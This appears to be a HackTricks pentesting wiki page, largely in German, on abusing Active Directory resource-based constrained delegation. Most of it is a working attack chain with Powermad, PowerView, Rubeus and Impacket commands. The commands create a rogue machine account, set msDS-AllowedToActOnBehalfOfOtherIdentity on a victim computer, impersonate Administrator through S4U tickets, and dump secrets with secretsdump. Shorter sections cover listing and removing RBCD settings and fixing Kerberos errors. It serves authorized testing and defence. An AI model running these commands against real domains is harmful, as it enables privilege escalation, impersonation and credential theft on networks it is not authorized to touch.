# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Grundlagen der Resource-based Constrained Delegation

This is similar to the basic [Constrained Delegation](constrained-delegation.md) but **instead** of giving permissions to an **object** to **impersonate any user against a machine**. Resource-based Constrain Delegation **sets** in **the object who is able to impersonate any user against it**.

In diesem Fall hat das eingeschränkte Objekt ein Attribut namens _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ mit dem Namen des Benutzers, der sich gegenüber diesem Objekt als beliebiger anderer Benutzer ausgeben kann.

Ein weiterer wichtiger Unterschied zwischen dieser Constrained Delegation und den anderen Delegationsarten ist, dass jeder Benutzer mit **write permissions over a machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) das **_msDS-AllowedToActOnBehalfOfOtherIdentity_** setzen kann (bei den anderen Formen der Delegation benötigte man Domain-Admin-Privilegien).

### Neue Konzepte

Früher wurde bei Constrained Delegation gesagt, dass das **`TrustedToAuthForDelegation`**-Flag im _userAccountControl_-Wert des Benutzers nötig ist, um ein **S4U2Self** durchzuführen. Das ist jedoch nicht ganz richtig.\
Tatsächlich kann man auch ohne diesen Wert ein **S4U2Self** gegen jeden Benutzer durchführen, wenn man ein **service** ist (einen SPN hat). Wenn man jedoch **`TrustedToAuthForDelegation`** hat, ist das zurückgegebene TGS **Forwardable**, und wenn man dieses Flag **nicht** hat, ist das zurückgegebene TGS **nicht** **Forwardable**.

Allerdings, wenn das in **S4U2Proxy** verwendete **TGS** **NICHT Forwardable** ist und man versucht, eine **basic Constrain Delegation** auszunutzen, wird es **nicht funktionieren**. Wenn man jedoch versucht, eine **Resource-Based constrain delegation** auszunutzen, funktioniert es.

### Angriffsaufbau

> Wenn du **write equivalent privileges** über ein **Computer**-Konto hast, kannst du **privileged access** auf diesem Rechner erhalten.

Angenommen, der Angreifer hat bereits **write equivalent privileges over the victim computer**.

1. Der Angreifer **kompromittiert** ein Konto, das einen **SPN** hat, oder **erstellt eines** („Service A“). Beachte, dass **jeder** _Admin User_ ohne weitere spezielle Rechte bis zu 10 Computerobjekte erstellen kann (**_MachineAccountQuota_**) und ihnen einen **SPN** zuweisen kann. Der Angreifer kann also einfach ein Computerobjekt erstellen und einen SPN setzen.
2. Der Angreifer **misbraucht seine WRITE-Privilegien** über den Opfer-Computer (ServiceB), um **resource-based constrained delegation** zu konfigurieren, sodass ServiceA sich gegenüber diesem Opfer-Computer (ServiceB) als beliebiger Benutzer ausgeben darf.
3. Der Angreifer verwendet Rubeus, um einen **full S4U attack** (S4U2Self und S4U2Proxy) von Service A zu Service B für einen Benutzer **mit privilegiertem Zugang zu Service B** durchzuführen.
1. S4U2Self (vom kompromittierten/erstellten SPN-Konto): Fordere ein **TGS of Administrator to me** an (Not Forwardable).
2. S4U2Proxy: Verwende das **not Forwardable TGS** aus dem vorherigen Schritt, um ein **TGS** vom **Administrator** an den **victim host** anzufordern.
3. Selbst wenn du ein nicht Forwardable TGS benutzt, wird es funktionieren, da du Resource-based constrained delegation ausnutzst.
4. Der Angreifer kann **pass-the-ticket** und **impersonate** den Benutzer, um **Zugriff auf den Opfer-ServiceB** zu erhalten.

Um das _**MachineAccountQuota**_ der Domain zu prüfen, kannst du verwenden:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Angriff

### Erstellen eines Computerobjekts

Sie können innerhalb der Domäne ein Computerobjekt mithilfe von **[powermad](https://github.com/Kevin-Robertson/Powermad):** erstellen.
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurieren von Resource-based Constrained Delegation

**Mit dem activedirectory PowerShell module**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Verwendung von powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Durchführung eines vollständigen S4U-Angriffs (Windows/Rubeus)

Zuerst haben wir das neue Computer-Objekt mit dem Passwort `123456` erstellt, daher benötigen wir den Hash dieses Passworts:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Dies gibt die RC4 und AES hashes für dieses Konto aus.\ Jetzt kann der Angriff durchgeführt werden:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Sie können mehr Tickets für zusätzliche Dienste erzeugen, indem Sie einmal den `/altservice`-Parameter von Rubeus verwenden:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Beachte, dass Benutzer ein Attribut namens "**Cannot be delegated**" haben. Wenn ein Benutzer dieses Attribut auf True gesetzt hat, kannst du dich nicht als dieser Benutzer ausgeben. Diese Eigenschaft ist in bloodhound sichtbar.

### Linux-Tooling: Ende-zu-Ende RBCD mit Impacket (2024+)

Wenn du von Linux aus arbeitest, kannst du die vollständige RBCD-Kette mit den offiziellen Impacket-Tools durchführen:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Hinweise
- If LDAP signing/LDAPS is enforced, use `impacket-rbcd -use-ldaps ...`.
- Bevorzugen Sie AES-Schlüssel; viele moderne Domains beschränken RC4. Impacket und Rubeus unterstützen beide AES-only flows.
- Impacket kann das `sname` ("AnySPN") für einige Tools umschreiben, aber ermitteln Sie das korrekte SPN, wann immer möglich (z. B. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Zugriff

Die letzte Befehlszeile führt den **kompletten S4U attack aus und injiziert das TGS** vom Administrator in den **Arbeitsspeicher** des Zielhosts.\
In diesem Beispiel wurde vom Administrator ein TGS für den **CIFS**-Dienst angefordert, sodass Sie auf **C$** zugreifen können:
```bash
ls \\victim.domain.local\C$
```
### Missbrauch verschiedener service tickets

Erfahre mehr über die [**available service tickets here**](silver-ticket.md#available-services).

## Auflisten, Audit und Bereinigung

### Computer mit konfiguriertem RBCD auflisten

PowerShell (decodieren des SD, um SIDs aufzulösen):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (mit einem Befehl lesen oder leeren):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Bereinigung / Zurücksetzen von RBCD

- PowerShell (Attribut löschen):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos-Fehler

- **`KDC_ERR_ETYPE_NOTSUPP`**: Das bedeutet, dass Kerberos so konfiguriert ist, DES oder RC4 nicht zu verwenden und Sie nur den RC4-Hash liefern. Geben Sie Rubeus mindestens den AES256-Hash (oder liefern Sie ihm einfach die rc4-, aes128- und aes256-Hashes). Beispiel: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Das bedeutet, dass die Uhrzeit des aktuellen Computers von der des DC abweicht und Kerberos nicht richtig funktioniert.
- **`preauth_failed`**: Das bedeutet, dass der angegebene Benutzername + Hashes nicht zum Einloggen funktionieren. Möglicherweise haben Sie vergessen, das "$" im Benutzernamen beim Erzeugen der Hashes zu setzen (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Das kann bedeuten:
  - Der Benutzer, den Sie zu impersonieren versuchen, kann auf den gewünschten Dienst nicht zugreifen (weil Sie ihn nicht impersonieren können oder weil er nicht genug Rechte hat)
  - Der angefragte Dienst existiert nicht (z. B. wenn Sie ein Ticket für winrm anfordern, aber winrm nicht läuft)
  - Der erstellte fakecomputer hat seine Berechtigungen auf dem verwundbaren Server verloren und Sie müssen sie wieder geben.
  - Sie missbrauchen klassisches KCD; denken Sie daran, dass RBCD mit non-forwardable S4U2Self-Tickets funktioniert, während KCD forwardable erfordert.

## Hinweise, Relays und Alternativen

- Sie können das RBCD SD auch über AD Web Services (ADWS) schreiben, wenn LDAP gefiltert ist. Siehe:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos-Relay-Ketten enden häufig in RBCD, um in einem Schritt local SYSTEM zu erreichen. Siehe praktische End-to-End-Beispiele:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Wenn LDAP signing/channel binding **deaktiviert** sind und Sie ein Maschinenkonto erstellen können, können Tools wie **KrbRelayUp** eine erzwungene Kerberos-Authentifizierung an LDAP relayen, `msDS-AllowedToActOnBehalfOfOtherIdentity` für Ihr Maschinenkonto am Zielcomputerobjekt setzen und sofort **Administrator** via S4U von off-host impersonate.

## Quellen

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../banners/hacktricks-training.md}}
